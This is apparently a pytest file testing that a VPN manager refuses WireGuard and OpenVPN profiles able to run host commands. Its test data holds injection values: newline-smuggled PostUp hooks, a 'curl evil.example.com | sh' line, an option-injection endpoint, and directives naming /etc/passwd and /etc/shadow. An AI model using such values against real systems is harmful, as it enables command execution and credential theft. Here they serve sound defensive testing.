"""A WireGuard profile must not be able to run commands on the host.

wg-quick executes PreUp/PostUp/PreDown/PostDown through a shell. The config
file was built by writing every stored field verbatim, so one newline in an
address, a key or an endpoint added a hook of the caller's choosing. These
tests drive the save paths (create, update, import) and the file builder with
hostile values and check that nothing reaches wg-quick.
"""

from __future__ import annotations

import base64

import pytest
from sqlmodel import select

import app.core.database as database_module
from app.core.database import run_migrations
from app.core.exceptions import ValidationError
from app.core.orm import get_session
from app.core.validation import validate_cidr, validate_wireguard_endpoint, validate_wireguard_key
from app.models.vpn import VpnProfile, VpnProtocol
from app.services import vpn_manager
from app.services.vpn_backends import wireguard

PRIV = base64.b64encode(bytes(range(32))).decode()
PEER = base64.b64encode(bytes(range(32, 64))).decode()
PSK = base64.b64encode(bytes(range(64, 96))).decode()
HOOK = "\nPostUp = touch /tmp/pwned"


@pytest.fixture(autouse=True)
async def _db(tmp_path, monkeypatch):
    monkeypatch.setattr(database_module, "DB_PATH", tmp_path / "test.db")
    monkeypatch.setattr(vpn_manager, "VPN_SECRETS_DIR", tmp_path / "vpn_secrets")
    await run_migrations()


def _config(**overrides) -> dict:
    peer = {
        "public_key": PEER,
        "endpoint": "vpn.example.com:51820",
        "allowed_ips": ["10.0.0.0/24"],
        "preshared_key": PSK,
        "persistent_keepalive": 25,
    }
    peer.update(overrides.pop("peer", {}))
    config = {
        "addresses": ["10.0.0.2/24"],
        "dns": ["10.0.0.1"],
        "mtu": 1420,
        "listen_port": 51820,
        "private_key": PRIV,
        "peers": [peer],
    }
    config.update(overrides)
    return config


async def _stored_profiles() -> list[VpnProfile]:
    async with get_session() as session:
        return list((await session.execute(select(VpnProfile))).scalars().all())


# ── The file builder ──────────────────────────────────────────────────────────


def test_a_valid_profile_builds_the_expected_file():
    text = wireguard._build_conf(
        _config(
            dns=["10.0.0.1", "corp.example.com"],
            peer={"endpoint": "[2001:db8::1]:51820", "allowed_ips": ["10.0.0.5/24", "::/0"]},
        )
    )
    assert text == (
        "[Interface]\n"
        "Address = 10.0.0.2/24\n"
        "DNS = 10.0.0.1, corp.example.com\n"
        "MTU = 1420\n"
        "ListenPort = 51820\n"
        f"PrivateKey = {PRIV}\n"
        "\n"
        "[Peer]\n"
        f"PublicKey = {PEER}\n"
        "Endpoint = [2001:db8::1]:51820\n"
        "AllowedIPs = 10.0.0.0/24, ::/0\n"
        f"PresharedKey = {PSK}\n"
        "PersistentKeepalive = 25\n"
    )


@pytest.mark.parametrize(
    "overrides",
    [
        {"addresses": ["10.0.0.2/24" + HOOK]},
        {"dns": ["10.0.0.1" + HOOK]},
        {"mtu": "1420" + HOOK},
        {"listen_port": "51820" + HOOK},
        {"private_key": PRIV + HOOK},
        {"peer": {"public_key": PEER + HOOK}},
        {"peer": {"endpoint": "vpn.example.com:51820" + HOOK}},
        {"peer": {"allowed_ips": ["10.0.0.0/24" + HOOK]}},
        {"peer": {"preshared_key": PSK + HOOK}},
        {"peer": {"persistent_keepalive": "25" + HOOK}},
        # ipaddress keeps an IPv6 scope id verbatim, newline and all.
        {"addresses": ["fe80::1%x" + HOOK + "/64"]},
        {"peer": {"allowed_ips": ["fe80::%x" + HOOK + "/64"]}},
        {"post_up": "touch /tmp/pwned"},
        {"peer": {"PostUp": "touch /tmp/pwned"}},
    ],
)
def test_the_builder_refuses_any_field_that_could_add_a_line(overrides):
    with pytest.raises(ValidationError):
        wireguard._build_conf(_config(**overrides))


async def test_a_hostile_stored_profile_never_reaches_wg_quick(monkeypatch):
    """Rows saved before validation existed are checked again at connect."""
    calls: list[list[str]] = []

    async def _fake_run(cmd, timeout=30):
        calls.append(cmd)
        return 0, "/usr/bin/wg-quick", ""

    monkeypatch.setattr(wireguard, "_run", _fake_run)
    with pytest.raises(ValidationError):
        await wireguard._connect_direct(_config(peer={"endpoint": "a:1" + HOOK}), "wg-test0")
    assert not any("up" in cmd for cmd in calls)


# ── Field validators ──────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "key",
    [
        PRIV[:-1],  # 43 characters
        PRIV + "A",  # 45 characters
        PRIV[:42] + "B=",  # the last data character must carry zero low bits
        " " + PRIV[1:],
        PRIV[:20] + "-" + PRIV[21:],  # URL-safe alphabet is not wg's
        "",
    ],
)
def test_malformed_keys_are_refused(key):
    with pytest.raises(ValidationError):
        validate_wireguard_key(key)


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("vpn.example.com:51820", "vpn.example.com:51820"),
        ("203.0.113.5:51820", "203.0.113.5:51820"),
        ("[2001:db8::1]:51820", "[2001:db8::1]:51820"),
    ],
)
def test_endpoints_normalise(value, expected):
    assert validate_wireguard_endpoint(value) == expected


@pytest.mark.parametrize(
    "value",
    [
        "vpn.example.com",
        "vpn.example.com:0",
        "vpn.example.com:70000",
        "a b:51820",
        "[10.0.0.1]:51820",
        "2001:db8::1:51820",
        "-oProxyCommand=x:51820",
        "[fe80::1%eth0]:51820",
    ],
)
def test_bad_endpoints_are_refused(value):
    with pytest.raises(ValidationError):
        validate_wireguard_endpoint(value)


def test_validate_cidr_refuses_an_ipv6_scope_id():
    with pytest.raises(ValidationError):
        validate_cidr("fe80::%eth0/64")


# ── Save paths ────────────────────────────────────────────────────────────────


async def test_create_refuses_a_hostile_config_and_stores_nothing():
    with pytest.raises(ValidationError):
        await vpn_manager.create_profile(
            "WG", VpnProtocol.wireguard, _config(addresses=["10.0.0.2/24" + HOOK])
        )
    assert await _stored_profiles() == []


async def test_create_requires_a_private_key():
    config = _config()
    del config["private_key"]
    with pytest.raises(ValidationError):
        await vpn_manager.create_profile("WG", VpnProtocol.wireguard, config)


async def test_update_refuses_a_hostile_config_and_keeps_the_stored_one():
    profile = await vpn_manager.create_profile("WG", VpnProtocol.wireguard, _config())
    before = (await vpn_manager.get_profile(profile.id)).config

    with pytest.raises(ValidationError):
        await vpn_manager.update_profile(profile.id, config=_config(dns=["1.1.1.1" + HOOK]))

    assert (await vpn_manager.get_profile(profile.id)).config == before


@pytest.mark.parametrize(
    "line",
    [
        "PostUp = curl evil.example.com | sh",
        "PreUp = id",
        "PreDown = id",
        "postdown = id",  # wg-quick matches keys without case
        "SaveConfig = true",
    ],
)
async def test_import_refuses_hook_directives(line):
    content = (
        f"[Interface]\nPrivateKey = {PRIV}\nAddress = 10.0.0.2/24\n{line}\n"
        f"[Peer]\nPublicKey = {PEER}\nAllowedIPs = 0.0.0.0/0\n"
    )
    with pytest.raises(ValidationError):
        await vpn_manager.import_profile("WG", content, "wireguard")
    assert await _stored_profiles() == []


async def test_import_reads_a_real_config_and_stores_it_normalised():
    content = (
        "[Interface]\n"
        f"PrivateKey = {PRIV}  # client key\n"
        "address = 10.0.0.2/24\n"
        "DNS = 10.0.0.1\n"
        "MTU = 1420\n"
        "\n"
        "[Peer]\n"
        f"PublicKey = {PEER}\n"
        "Endpoint = vpn.example.com:51820\n"
        "AllowedIPs = 10.0.0.0/24, 192.168.1.0/24\n"
        "PersistentKeepalive = 25\n"
    )
    profile = await vpn_manager.import_profile("WG", content, "wireguard")
    stored = (await vpn_manager.get_profile(profile.id)).config

    assert stored["addresses"] == ["10.0.0.2/24"]
    assert stored["mtu"] == 1420
    assert stored["peers"][0]["endpoint"] == "vpn.example.com:51820"
    assert stored["peers"][0]["allowed_ips"] == ["10.0.0.0/24", "192.168.1.0/24"]
    assert stored["peers"][0]["persistent_keepalive"] == 25


async def test_import_refuses_a_hostile_value_in_an_allowed_directive():
    content = (
        f"[Interface]\nPrivateKey = {PRIV}\nAddress = 10.0.0.2/24; touch /tmp/pwned\n"
        f"[Peer]\nPublicKey = {PEER}\nAllowedIPs = 0.0.0.0/0\n"
    )
    with pytest.raises(ValidationError):
        await vpn_manager.import_profile("WG", content, "wireguard")


@pytest.mark.parametrize(
    "line", ["auth-user-pass /etc/sybr-hub/settings.json", "config /etc/passwd", "ca /etc/shadow"]
)
async def test_an_openvpn_profile_that_names_hub_files_is_refused_on_save(line):
    content = f"client\nremote vpn.example.com 1194\n{line}\n"
    with pytest.raises(ValidationError):
        await vpn_manager.import_profile("OVPN", content, "openvpn")
    assert await _stored_profiles() == []
